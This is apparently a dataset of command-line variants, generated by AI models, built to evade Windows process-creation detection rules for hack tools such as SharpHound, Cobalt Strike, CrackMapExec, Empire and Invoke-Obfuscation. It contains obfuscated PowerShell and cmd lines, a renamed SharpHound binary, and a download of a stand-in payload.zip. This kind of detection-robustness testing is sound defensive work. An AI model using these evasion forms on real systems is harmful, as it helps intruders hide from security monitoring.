rule_name,commandline_evasion,row_count,sources
proc_creation_win_gpresult_execution,gpresult.exe -z,1,gemini
proc_creation_win_gup_download,GUP.exe -unzipTo C:\Temp h t t p : / / example.com/payload.zip,1,gemini
proc_creation_win_gup_download,GUP.exe -unzipTo=C:\Temp $env:url,1,gemini
proc_creation_win_hktl_bloodhound_sharphound,"cmd.exe /""c"" SharpHound.exe -jsOnFolDEr C:\temp /""ZipFileName"" C:\temp\sharphound.zip",13,gemini:12; qwen32b
proc_creation_win_hktl_bloodhound_sharphound,"copy SharpHound.exe not_suspicious.exe; .\not_suspicious.exe --collectionmethods ""Default"" --domain ""contoso.local"" --zipfilename:""data.zip""",13,gemini:12; qwen32b
proc_creation_win_hktl_bloodhound_sharphound,"copy SharpHound.exe not_suspicious.exe; .\not_suspicious.exe --collectionmethods=""All"" --domain ""contoso.local""",13,gemini:12; qwen32b
proc_creation_win_hktl_cobaltstrike_bloopers_modules,"cmd.exe -""c"" ""I^nvoke-UserH^unter""",1,gemini
proc_creation_win_hktl_cobaltstrike_bloopers_modules,"cmd.exe /""c"" ""I^nvoke-UserH^unter""",1,gemini
proc_creation_win_hktl_cobaltstrike_load_by_rundll32,"rundll32 ""2.dll, StartW""",1,qwen14b
proc_creation_win_hktl_cobaltstrike_load_by_rundll32,"rundll32 2.dll, ""StartW""",2,gemini:2
proc_creation_win_hktl_cobaltstrike_load_by_rundll32,"rundll32 2.dll, StartW & rem",1,gemini
proc_creation_win_hktl_cobaltstrike_load_by_rundll32,"rundll32 2.dll,#1",1,gemini
proc_creation_win_hktl_cobaltstrike_load_by_rundll32,"rundll32.exe ""payload.dll"",StartW",1,gemini
proc_creation_win_hktl_cobaltstrike_load_by_rundll32,"rundll32.exe C:\temp\payload.dll,StartW",1,gemini
proc_creation_win_hktl_cobaltstrike_load_by_rundll32,"rundll32.exe payload.dll,StartW",1,gemini
proc_creation_win_hktl_cobaltstrike_process_patterns,"cmd.exe -""k"" whoami",1,gemini
proc_creation_win_hktl_cobaltstrike_process_patterns,"cmd.exe /""k"" whoami",1,gemini
proc_creation_win_hktl_covenant,"powershell.exe -""e"" cwB2ACAAbwAgA...",2,gemini:2
proc_creation_win_hktl_covenant,"powershell.exe /""e"" cwB2ACAAbwAgA...",2,gemini:2
proc_creation_win_hktl_crackmapexec_execution_patterns,"cmd.exe -""C"" 2>&1 1> \\127.0.0.1\C$\Temp\output.txt whoami",5,gemini:4; qwen32b
proc_creation_win_hktl_crackmapexec_execution_patterns,cmd.exe /C 2>&1 1> \\127.0.0.1\C$\Temp\output.txt whoami,5,gemini:4; qwen32b
proc_creation_win_hktl_crackmapexec_execution_patterns,cmd.exe /c 2>&1 1> \\127.0.0.1\C$\Temp\output.txt whoami,5,gemini:4; qwen32b
proc_creation_win_hktl_crackmapexec_execution_patterns,"powershell.exe -""nop"" -noni -w 1 /""exec"" bypass /""c"" ""Write-Host 'Test'""",2,gemini; qwen32b
proc_creation_win_hktl_crackmapexec_execution_patterns,"powershell.exe -NoProfile -nONI -w 1 -""exec"" bypass -C ""Write-Host 'Test'""",1,gemini
proc_creation_win_hktl_crackmapexec_execution_patterns,"powershell.exe -NoProfile -noNI /""w"" 1 /""exec"" bypass /""c"" ""Write-Host 'Test'""",1,gemini
proc_creation_win_hktl_crackmapexec_execution_patterns,"powershell.exe -NoProfile -noni -W 1 /""exec"" bypass -Command ""Write-Host 'Test'""",2,gemini; qwen32b
proc_creation_win_hktl_crackmapexec_powershell_obfuscation,"powershell.exe -""Command"" ""$a = 'j'; $b = 'o'; $c = 'i'; $d = 'n'; $e = 's'; $f = 'p'; $g = 'l'; $h = 'i'; $i = 't'; $cmd = $a+$b+$c+$d+' '+$e+$f+$g+$h+$i; Invoke-Expression ('Write-Host ' + $cmd)""",3,gemini:2; qwen32b
proc_creation_win_hktl_crackmapexec_powershell_obfuscation,"powershell.exe -""EncodedCommand"" JABzID0gJ2pvaW4nOyAkcyArPSAnc3BsaXQnOyBXcml0ZS1Ib3N0ICRz",3,gemini:2; qwen32b
proc_creation_win_hktl_crackmapexec_powershell_obfuscation,"powershell.exe -COmMaNd ""$a = 'j'; $b = 'o'; $c = 'i'; $d = 'n'; $e = 's'; $f = 'p'; $g = 'l'; $h = 'i'; $i = 't'; $cmd = $a+$b+$c+$d+' '+$e+$f+$g+$h+$i; Invoke-Expression ('Write-Host ' + $cmd)""",5,gemini:4; qwen32b
proc_creation_win_hktl_crackmapexec_powershell_obfuscation,"powershell.exe -CoMMAnD ""$a = 'j'; $b = 'o'; $c = 'i'; $d = 'n'; $e = 's'; $f = 'p'; $g = 'l'; $h = 'i'; $i = 't'; $cmd = $a+$b+$c+$d+' '+$e+$f+$g+$h+$i; Invoke-Expression ('Write-Host ' + $cmd)""",5,gemini:4; qwen32b
proc_creation_win_hktl_crackmapexec_powershell_obfuscation,"powershell.exe -Command ""$a = 'j'; $b = 'o'; $c = 'i'; $d = 'n'; $e = 's'; $f = 'p'; $g = 'l'; $h = 'i'; $i = 't'; $cmd = $a+$b+$c+$d+' '+$e+$f+$g+$h+$i; Invoke-Expression ('Write-Host ' + $cmd)""",5,gemini:4; qwen32b
proc_creation_win_hktl_crackmapexec_powershell_obfuscation,"powershell.exe -c ""$a = 'j'; $b = 'o'; $c = 'i'; $d = 'n'; $e = 's'; $f = 'p'; $g = 'l'; $h = 'i'; $i = 't'; $cmd = $a+$b+$c+$d+' '+$e+$f+$g+$h+$i; Invoke-Expression ('Write-Host ' + $cmd)""",5,gemini:4; qwen32b
proc_creation_win_hktl_crackmapexec_powershell_obfuscation,"powershell.exe /""Command"" ""$a = 'j'; $b = 'o'; $c = 'i'; $d = 'n'; $e = 's'; $f = 'p'; $g = 'l'; $h = 'i'; $i = 't'; $cmd = $a+$b+$c+$d+' '+$e+$f+$g+$h+$i; Invoke-Expression ('Write-Host ' + $cmd)""",3,gemini:2; qwen32b
proc_creation_win_hktl_crackmapexec_powershell_obfuscation,"powershell.exe /""EncodedCommand"" JABzID0gJ2pvaW4nOyAkcyArPSAnc3BsaXQnOyBXcml0ZS1Ib3N0ICRz",3,gemini:2; qwen32b
proc_creation_win_hktl_dumpert,"rundll32.exe C:\Temp\custom_dump.dll,Dump",1,gemini
proc_creation_win_hktl_empire_powershell_uac_bypass,powershell -NoP -NonI -w Hidden -c $x=$((Get-ItemProperty -Path HKCU:\Software\Microsoft\Windows\Update).Update),2,qwen14b:2
proc_creation_win_hktl_empire_powershell_uac_bypass,powershell -NoP -NonI -w Hidden -c $x=$((Get-ItemProperty -Path HKCU:\Software\Microsoft\Windows\Update).Update);,3,qwen14b:2; qwen32b
proc_creation_win_hktl_empire_powershell_uac_bypass,powershell.exe	-NoP	-NonI	-w	Hidden	-c	$x=$((gp	HKCU:Software\Microsoft\Windows Update).Update),3,gemini:2; qwen32b
proc_creation_win_hktl_empire_powershell_uac_bypass,powershell.exe  -NoP  -NonI  -w  Hidden  -c  $x=$((gp  HKCU:Software\Microsoft\Windows Update).Update),2,gemini:2
proc_creation_win_hktl_empire_powershell_uac_bypass,"powershell.exe ""-NoP"" ""-NonI"" ""-w"" ""Hidden"" ""-c"" ""$x=$((gp HKCU:Software\Microsoft\Windows Update).Update)""",3,gemini:2; qwen32b
proc_creation_win_hktl_empire_powershell_uac_bypass,powershell.exe -NoP -NonI -w Hidden -Command $x=$((Get-Item HKCU:\Software\Microsoft\Windows\Update).Update),2,qwen32b:2
proc_creation_win_hktl_empire_powershell_uac_bypass,powershell.exe -NoP -NonI -w Hidden -Command $x=$((Get-Item HKCU:\Software\Microsoft\Windows\Update).Update) # comment,2,qwen32b:2
proc_creation_win_hktl_empire_powershell_uac_bypass,powershell.exe -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows\Update).Update),2,qwen32b:2
proc_creation_win_hktl_empire_powershell_uac_bypass,"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command ""$x=$((Get-ItemProperty HKCU:Software\Microsoft\WindowsUpdate).Update); Invoke-Expression $x""",2,gemini:2
proc_creation_win_hktl_empire_powershell_uac_bypass,powershell.exe -NonI -NoP -w Hidden -Command $x=$((Get-Item HKCU:\Software\Microsoft\Windows\Update).Update),2,qwen32b:2
proc_creation_win_hktl_empire_powershell_uac_bypass,powershell.exe -NonI -NoP -w Hidden -Command $x=$((gp HKCU:Software\Microsoft\Windows\Update).Update),2,qwen32b:2
proc_creation_win_hktl_empire_powershell_uac_bypass,"powershell.exe -NonI -NoP -w Hidden -c ""$x=$((gp 'HKCU:Software\Microsoft\Windows Update').Update)""",3,gemini:2; qwen32b
proc_creation_win_hktl_empire_powershell_uac_bypass,"powershell.exe -NonI -w hidden -c ""$x=$((gp HKCU:\Software\Microsoft\Windows\Update).Update)""",2,gemini:2
proc_creation_win_hktl_hashcat,C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe --attack-mode 0 -m 1000 -r .,1,gemini
proc_creation_win_hktl_hashcat,C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe -a  0 -m 1000  -r  .,1,gemini
proc_creation_win_hktl_hashcat,C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe -a 0 --hash-type 1000 -r .,1,gemini
proc_creation_win_hktl_hashcat,ules\Incisive-leetspeak.rule C:\AtomicRedTeam\atomics\T1110.002\src\sam.txt C:\AtomicRedTeam\atomics\T1110.002\src\password.lst,3,gemini:3
proc_creation_win_hktl_impacket_lateral_movement,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\127.0.0.2\ADMIN$\output.txt' -ComputerName 10.0.0.5""",5,gemini:4; qwen32b
proc_creation_win_hktl_impacket_lateral_movement,"powershell.exe -nop -WINdowstyle Hidden -c ""Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\127.0.0.2\ADMIN$\output.txt' -ComputerName 10.0.0.5""",5,gemini:4; qwen32b
proc_creation_win_hktl_impacket_lateral_movement,"powershell.exe -nop -WIndowsTyLe Hidden -cOMMAnd ""Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\127.0.0.2\ADMIN$\output.txt' -ComputerName 10.0.0.5""",5,gemini:4; qwen32b
proc_creation_win_hktl_impacket_lateral_movement,"powershell.exe -nop -WiNdoWsTYle Hidden -c ""Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\127.0.0.2\ADMIN$\output.txt' -ComputerName 10.0.0.5""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_clip,"cmd -""c"" ""echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \"" iex([System.Windows.Forms.Clipboard]::GetText())\""""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_clip,"cmd -""c"" ""echo Write-Host 'Test Execution' | clip & powershell -NoProfile -Command Add-Type -AssemblyName System.Windows.Forms; IEX([System.Windows.Forms.Clipboard]::GetText())""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_clip,"cmd /""c"" ""echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \"" iex([System.Windows.Forms.Clipboard]::GetText())\""""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_clip,"cmd /""c"" ""echo Write-Host 'Test Execution' | clip & powershell -NoProfile -Command Add-Type -AssemblyName System.Windows.Forms; IEX([System.Windows.Forms.Clipboard]::GetText())""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_clip,"cmd /c ""echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \""iex([System.Windows.Forms.Clipboard]::GetText())\""""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_clip,"cmd /c ""echo Write-Host 'Test Execution' | clip & powershell -NoProfile -Command Add-Type -AssemblyName System.Windows.Forms; IEX([System.Windows.Forms.Clipboard]::GetText())""",1,gemini
proc_creation_win_hktl_invoke_obfuscation_obfuscated_iex_commandline,"powershell.exe /""c"" ""& ([string]::Join('', ([char]73, [char]69, [char]88))) 'Write-Host Educational_Test'""",1,gemini
proc_creation_win_hktl_invoke_obfuscation_stdin,"cmd.exe -""c"" ""echo Write-Host 'Bypass' | powershell.exe -noprofile -command -""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_stdin,"cmd.exe -""c"" ""echo Write-Host 'Bypass' | pwsh.exe -noexit -""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_stdin,"cmd.exe /""c"" ""echo Write-Host 'Bypass' | powershell.exe -noprofile -command -""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_stdin,"cmd.exe /""c"" ""echo Write-Host 'Bypass' | pwsh.exe -noexit -""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_stdin,"cmd.exe /C ""echo Write-Host 'Bypass' | powershell.exe -noprofile -command -""",3,gemini:2; qwen32b
proc_creation_win_hktl_invoke_obfuscation_stdin,"cmd.exe /c ""echo Write-Host 'Bypass' | powershell.exe -noprofile -command -""",3,gemini:2; qwen32b
proc_creation_win_hktl_invoke_obfuscation_var,"powershell.exe -COMmanD ""$env:TEST_VAR = 'Write-Output ''Execution Simulated'''; Invoke-Expression $env:TEST_VAR""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_var,"powershell.exe -CoMmANd ""$env:TEST_VAR = 'Write-Output ''Execution Simulated'''; Invoke-Expression $env:TEST_VAR""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_var,"powershell.exe -CommAnD ""$env:TEST_VAR = 'Write-Output ''Execution Simulated'''; Invoke-Expression $env:TEST_VAR""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_var,"powershell.exe -Command ""$env:TEST_VAR = 'Write-Output ''Execution Simulated'''; Invoke-Expression $env:TEST_VAR""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_var,"powershell.exe -c ""$env:TEST_VAR = 'Write-Output ''Execution Simulated'''; Invoke-Expression $env:TEST_VAR""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_var,"powershell.exe -cOMMaNd ""$env:TEST_VAR = 'Write-Output ''Execution Simulated'''; Invoke-Expression $env:TEST_VAR""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_var,"powershell.exe -cOmMaND ""$env:TEST_VAR = 'Write-Output ''Execution Simulated'''; Invoke-Expression $env:TEST_VAR""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_var,"powershell.exe /""Command"" ""$env:TEST_VAR = 'Write-Output ''Execution Simulated'''; Invoke-Expression $env:TEST_VAR""",2,gemini:2
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell -Command ""[System.IO.Compression.DeflateStream]::new([System.IO.MemoryStream][System.Text.Encoding]::ASCII.GetBytes('HelloWorld'), [System.IO.Compression.CompressionMode]::Decompress)""",2,qwen14b:2
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell -Command ""[System.IO.Compression.DeflateStream]::new([System.IO.MemoryStream][System.Text.Encoding]::ASCII.GetBytes('Sample'), [System.IO.Compression.CompressionMode]::Decompress)""",3,qwen14b:2; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell -Command ""[System.IO.Compression.DeflateStream]::new([System.IO.MemoryStream][System.Text.Encoding]::ASCII.GetBytes('TestData'), [System.IO.Compression.CompressionMode]::Decompress)""",2,qwen14b:2
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell -Command ""[System.IO.Compression.DeflateStream]::new([System.IO.StreamReader]::new([System.IO.StreamReader]::new([System.Text.Encoding]::ASCII.GetBytes('$(echo ""COMPRESS OBFUSCATION"" | Out-String)')).BaseStream).BaseStream).ReadToEnd() | Out-String | Invoke-Expression""",2,qwen32b:2
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell -c ""& { [System.IO.Compression.DeflateStream] $d = [System.IO.StreamReader]::new([System.IO.StreamReader]::new([System.Text.Encoding]::ASCII.GetBytes('$(echo ""COMPRESS OBFUSCATION"" | Out-String)')).BaseStream); $d.ReadToEnd() | iex }""",2,qwen32b:2
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -""Command"" ""$d = N`ew-Object System.IO.Compression.DeflateStream($s, 0); $r = N`ew-Object System.IO.StreamReader($d, [System.T`ext.Encoding]::ASCII); $r.ReadToEnd()""",3,gemini:2; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -""Command"" ""$stream = [System.IO.Compression.DeflateStream]::new($ms, 0); $reader = [System.IO.StreamReader]::new($stream, [System.Text.Encoding]::UTF8); iex $reader.ReadToEnd()""",3,gemini:2; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -COMmaND ""$stream = [System.IO.Compression.DeflateStream]::new($ms, 0); $reader = [System.IO.StreamReader]::new($stream, [System.Text.Encoding]::UTF8); iex $reader.ReadToEnd()""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -COmMAnD ""$d = N`ew-Object System.IO.Compression.DeflateStream($s, 0); $r = N`ew-Object System.IO.StreamReader($d, [System.T`ext.Encoding]::ASCII); $r.ReadToEnd()""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -CoMMAND ""$d = N`ew-Object System.IO.Compression.DeflateStream($s, 0); $r = N`ew-Object System.IO.StreamReader($d, [System.T`ext.Encoding]::ASCII); $r.ReadToEnd()""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -CoMmAnd ""$d = N`ew-Object System.IO.Compression.DeflateStream($s, 0); $r = N`ew-Object System.IO.StreamReader($d, [System.T`ext.Encoding]::ASCII); $r.ReadToEnd()""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -Command ""$d = N`ew-Object System.IO.Compression.DeflateStream($s, 0); $r = N`ew-Object System.IO.StreamReader($d, [System.T`ext.Encoding]::ASCII); $r.ReadToEnd()""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -Command ""$stream = [System.IO.Compression.DeflateStream]::new($ms, 0); $reader = [System.IO.StreamReader]::new($stream, [System.Text.Encoding]::UTF8); iex $reader.ReadToEnd()""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -c ""$d = N`ew-Object System.IO.Compression.DeflateStream($s, 0); $r = N`ew-Object System.IO.StreamReader($d, [System.T`ext.Encoding]::ASCII); $r.ReadToEnd()""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -c ""$stream = [System.IO.Compression.DeflateStream]::new($ms, 0); $reader = [System.IO.StreamReader]::new($stream, [System.Text.Encoding]::UTF8); iex $reader.ReadToEnd()""",4,gemini:4
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -cOMMAND ""$d = N`ew-Object System.IO.Compression.DeflateStream($s, 0); $r = N`ew-Object System.IO.StreamReader($d, [System.T`ext.Encoding]::ASCII); $r.ReadToEnd()""",4,gemini:4
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe -cOmMaNd ""$stream = [System.IO.Compression.DeflateStream]::new($ms, 0); $reader = [System.IO.StreamReader]::new($stream, [System.Text.Encoding]::UTF8); iex $reader.ReadToEnd()""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_compress,"powershell.exe /""Command"" ""$stream = [System.IO.Compression.DeflateStream]::new($ms, 0); $reader = [System.IO.StreamReader]::new($stream, [System.Text.Encoding]::UTF8); iex $reader.ReadToEnd()""",2,gemini:2
proc_creation_win_hktl_invoke_obfuscation_via_stdin,"cmd.exe /""c"" ""set A=in^voke & set B=environment & echo %A% | powershell -""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_stdin,"cmd.exe /V:ON /C ""set a=in&& set b=voke&& set c=!a!!b!&& echo !c! | powershell -""",2,gemini:2
proc_creation_win_hktl_invoke_obfuscation_via_stdin,"powershell.exe -Command ""set-variable -Name env -Value 'test' && set-content -Path env:\VAR -Value 'obfuscate' && invoke-expression $env:VAR""",2,qwen32b:2
proc_creation_win_hktl_invoke_obfuscation_via_stdin,"powershell.exe /""ExecutionPolicy"" Bypass -c ""$invoke='payload'; Write-Host 'Test Execution'""",3,gemini:2; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_use_clip,"cmd.exe /c ""echo Write-Host 'Test' | c^l^i^p.exe && powershell -c \""IEX ([System.Windows.Forms.Clipboard]::GetText())\""""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_use_clip,"cmd.exe /c ""echo Write-Host 'Test' | clip & powershell -c \""IEX ([System.Windows.Forms.Clipboard]::GetText())\""""",5,gemini:4; qwen32b
proc_creation_win_hktl_invoke_obfuscation_via_use_clip,"cmd.exe /c echo Write-Host ""'Bypass Test'"" | clip & powershell -""c"" IEX([Windows.Forms.Clipboard]::GetText())",3,gemini:2; qwen32b
proc_creation_win_hktl_koadic,"cmd.exe -""^q"" /^C c^hcp 437",4,gemini:3; qwen32b
